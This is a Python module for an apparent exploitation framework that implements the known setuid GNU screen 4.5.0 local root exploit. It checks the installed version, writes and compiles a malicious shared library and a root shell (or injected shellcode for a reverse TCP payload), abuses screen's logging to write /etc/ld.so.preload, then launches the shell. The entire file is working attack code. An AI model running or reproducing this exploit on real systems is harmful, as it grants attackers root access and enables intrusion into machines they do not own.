from os import system, popen
from subprocess import Popen, PIPE
from time import sleep

from module_payload import PayloadModule


class BoomerModule(PayloadModule):
    def __init__(self):
        info = {"Name": "Screen Root",
                "Author": "Josue Encinar",
                "Description": "setuid screen v 4.5.0 local root exploit",
                "Reference": "https://www.exploit-db.com/exploits/41154/",
                "Acknowledgements": "Xiphos Research Ltd"
                }
        options = {}
        compatible = ["msf/linux/x64/shell_reverse_tcp"]
        super(BoomerModule, self).__init__(options, info, compatible)

    def check(self):
        try:
            response = Popen(["screen", "--version"], stdout=PIPE, stderr=PIPE).communicate()[0]
            if b"4.05." in response:
                self.print_ok("Vulnerable")
            else:
                self.print_error("No Vulnerable")
        except Exception:
            self.print_error("No found screen")

    def run(self):
        self.task1()
        print("Trying to get Root Shell")
        sleep(3)
        self.task2()

    def task1(self):
        with open("/tmp/libhax.c", "w") as libhax:
            libhax.write('''
        #include <stdio.h>
        #include <sys/types.h>
        #include <unistd.h>
        __attribute__ ((__constructor__))
        void dropshell(void){
            chown("/tmp/shell", 0, 0);
            chmod("/tmp/shell", 04755);
            uid_t getuid(void){
                return 0;
            }
            
        }
        ''')
        payload = self.options["payload"][1]
        if not payload:
            shell = open("/tmp/shell.c", "w")
            shell.write('''
            #include <stdio.h>
            int main(void){
              unlink("/etc/ld.so.preload");
              execvp("/bin/sh", NULL, NULL);
            }
            ''')
        else:
            shell = open("/tmp/shell.c", "wb")
            sh = ""
            sh = self.payload.get_shellcode()
            shell.write(b'''
            unsigned char shell_c [] = "%s";
            int main() {
                 unlink("/etc/ld.so.preload");
                void (*function_p) (void);
                function_p = (void *)shell_c;
                function_p();
            }
            ''' % (sh))
        shell.close()

        junk = popen("""
        screen -D -m gcc -shared -ldl -o /tmp/libhax.so /tmp/libhax.c 2> /dev/null;
        screen -D -m gcc -z execstack -o /tmp/shell /tmp/shell.c 2> /dev/null;
        rm -f /tmp/shell.c; rm -f /tmp/libhax.c
        """)

        self.print_info("Creating /etc/ld.so.preload file")
        p = popen('''
        umask 0;
        screen -D -m -q -L /etc/ld.so.preload echo -ne  "/tmp/libhax.so";
        ''')

    def task2(self):
        system("screen -lsq 2>&1 >/dev/null")
        if payload := self.options["payload"][1]:
            self.print_info(f"Launching payload: {payload}")
            self.print_info("Host: " + str(self.options["lhost"][1]))
            self.print_info("Port: " + str(self.options["lport"][1]))
        else:
            self.print_info("Launching Local Root Shell")
        system("/tmp/shell")
